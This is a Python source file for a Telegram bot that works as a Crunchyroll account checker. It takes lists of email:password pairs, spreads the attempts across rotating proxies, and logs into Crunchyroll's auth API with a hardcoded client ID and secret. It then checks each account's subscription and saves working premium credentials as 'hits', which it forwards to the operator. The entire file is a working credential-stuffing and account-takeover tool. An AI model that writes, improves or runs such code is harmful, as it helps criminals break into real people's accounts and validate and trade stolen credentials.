import os
import asyncio
import uuid
import random
import threading
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram import F

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
NOTIFICATION_CHAT_ID = os.getenv("NOTIFICATION_CHAT_ID", "")
AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Globals
checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0, 'error': 0}
lock = threading.Lock()

# ================== CHECKER CLASS (Improved) ==================
class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.countries = {
            "US": "United States 🇺🇸", "BR": "Brazil 🇧🇷", "GB": "United Kingdom 🇬🇧",
            "IN": "India 🇮🇳", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷", "JP": "Japan 🇯🇵"
            # Add more if needed
        }

    def _get_random_proxy(self):
        if not self.proxies:
            return None
        p = random.choice(self.proxies)
        return {'http': f'http://{p}', 'https': f'http://{p}'}

    def check(self, email: str, password: str):
        try:
            session = requests.Session()
            if proxy := self._get_random_proxy():
                session.proxies.update(proxy)

            # Login
            login_data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': 'y2arvjb0h0rgvtizlovy',
                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                'device_type': 'Baron',
                'device_id': str(uuid.uuid4()),
                'device_name': 'Baron'
            }

            r = session.post("https://beta-api.crunchyroll.com/auth/v1/token",
                             data=login_data, timeout=15)

            if r.status_code != 200 or "access_token" not in r.text:
                return {"status": "INVALID", "email": email}

            token = r.json()["access_token"]
            headers = {"authorization": f"Bearer {token}"}

            # Account + Subscription
            me = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, timeout=10).json()
            sub = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{me.get('external_id')}", 
                            headers=headers, timeout=10).json()

            is_premium = bool(sub.get("is_active") and not sub.get("is_cancelled"))

            result = {
                "status": "PREMIUM" if is_premium else "FREE",
                "email": email,
                "password": password,
                "verified": me.get("email_verified", False),
                "expiry": str(sub.get("next_renewal_date", "N/A"))[:10],
                "country": self.countries.get(sub.get("country_code"), sub.get("country_code", "Unknown")),
                "plan": sub.get("tier", "FAN MEMBER")
            }

            return result

        except:
            return {"status": "ERROR", "email": email}


def save_and_send_hit(result, chat_id):
    try:
        capture = f"""
🎯 PREMIUM HIT
EMAIL     : {result['email']}
PASSWORD  : {result['password']}
VERIFIED  : {result['verified']}
PLAN      : {result['plan']}
EXPIRY    : {result['expiry']}
COUNTRY   : {result['country']}
"""
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write("="*50 + capture + "="*50 + "\n\n")

        # Send to user
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT FOUND!</b>\n<pre>{capture}</pre>", parse_mode="HTML"),
            loop
        )
    except:
        pass


# ================== BOT HANDLERS ==================
@dp.message(Command("start"))
async def start(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    await message.answer("✅ **Crunchyroll Checker Ready**\n\nUse /check and send combos or file", parse_mode="Markdown")


@dp.message(Command("stats"))
async def stats_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS: return
    await message.answer(f"📊 Checked: {stats['checked']}\n✅ Premium: {stats['premium']}\n🆓 Free: {stats['free']}")


@dp.message(Command("hits"))
async def hits_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("hits.txt"):
        return await message.answer("No hits yet.")
    await message.answer_document(FSInputFile("hits.txt"), caption="Your Premium Hits")


@dp.message(F.document | F.text)
async def handle_input(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return await message.answer("Unauthorized.")

    global checker

    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text

    lines = [line.strip() for line in content.splitlines() if ":" in line and len(line) > 5]

    if not lines:
        return await message.answer("No valid email:password found.")

    # Proxy detection (if no @ in first few lines)
    if "@" not in "".join(lines[:5]):
        global proxies
        proxies = lines
        checker.proxies = proxies
        return await message.answer(f"✅ Loaded {len(proxies)} proxies.")

    # Combos
    await message.answer(f"🚀 Checking {len(lines)} combos...")

    for line in lines:
        threading.Thread(target=check_combo, args=(line, message.from_user.id), daemon=True).start()


def check_combo(combo: str, chat_id: int):
    global checker
    try:
        email, password = combo.split(":", 1)
        result = checker.check(email.strip(), password.strip())

        with lock:
            stats['checked'] += 1
            if result["status"] == "PREMIUM":
                stats['premium'] += 1
                save_and_send_hit(result, chat_id)
            elif result["status"] == "FREE":
                stats['free'] += 1
            else:
                stats['invalid'] += 1
    except:
        with lock:
            stats['error'] += 1


# ================== START ==================
async def main():
    global checker, loop
    loop = asyncio.get_running_loop()
    checker = CrunchyrollChecker(proxies)
    print("✅ Bot started successfully!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
